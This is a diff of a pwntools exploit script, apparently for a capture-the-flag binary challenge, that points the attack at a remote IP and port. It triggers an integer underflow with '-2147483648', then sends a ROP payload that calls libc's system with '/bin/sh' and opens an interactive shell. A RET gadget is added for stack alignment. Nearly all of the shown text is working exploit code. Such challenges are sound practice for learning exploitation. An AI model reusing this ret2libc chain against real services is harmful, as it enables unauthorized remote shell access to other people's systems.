@@ -7,12 +7,12 @@ e = ELF('./challenge')
 rop = ROP(e)
 
 # LOCAL
-libc = e.libc
-r = process('./challenge')
+#libc = e.libc
+#r = process('./challenge')
 
 # REMOTE
-#libc = ELF('./libc.so.6')
-#r = remote('122.38.251.9', 30013)
+libc = ELF('./libc.so.6')
+r = remote('122.38.251.9', 30013)
 
 INT_UNDERFLOW_TRIGGER = b'-2147483648'
 
@@ -52,7 +52,7 @@ print('[+] LIBC_BINSH : ' + hex(u64(LIBC_BINSH)))
 print('[+] LIBC_SYSTEM : ' + hex(u64(LIBC_SYSTEM)))
 
 # 4. Get Shell
-PAYLOAD = DUMMY + b'\x41' * 8 + PR_ADDR + LIBC_BINSH + LIBC_SYSTEM
+PAYLOAD = DUMMY + b'\x41' * 8 + RET+ PR_ADDR + LIBC_BINSH + LIBC_SYSTEM
 
 print(r.recvuntil(b'\n'))
 print(r.recvuntil(b'[>] '))
@@ -61,5 +61,4 @@ r.sendline(INT_UNDERFLOW_TRIGGER)
 print(r.recvuntil(b'\n'))
 print(r.recvuntil(b'\n'))
 r.sendline(PAYLOAD)
-r.sendline(b'cat flag')
 r.interactive()
